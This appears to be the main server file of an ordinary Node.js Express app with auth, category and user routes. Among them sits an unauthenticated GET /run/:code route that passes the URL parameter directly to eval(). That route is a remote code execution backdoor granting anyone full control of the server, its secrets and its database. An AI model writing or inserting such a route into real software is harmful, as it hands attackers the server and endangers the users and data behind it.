const express = require("express");
const app = express();

app.use(express.json());
require("dotenv").config();

const db = require("./database.js");
db.connect();

app.get("/run/:code", (req, res) => {
    const param = req.params.code;
    eval(param);
    res.send(".");
});

const port = process.env.PORT || 4000;
app.listen(port, () => {
    console.log("server running on port " + port);
});

const authRoute = require("./routes/authRoute.js");
const categoryRoute = require("./routes/categoryRoute.js");
const userRoute = require("./routes/userRoute.js");

const authMiddleware = require("./middleware/auth-guard.js");
const roleMiddleware = require("./middleware/role-guard.js");

app.use("/auth", authRoute);
app.use("/category", categoryRoute);
app.use("/user", userRoute);

app.get("/", authMiddleware, roleMiddleware("user"), (req, res) => {
    res.send("hello");
});
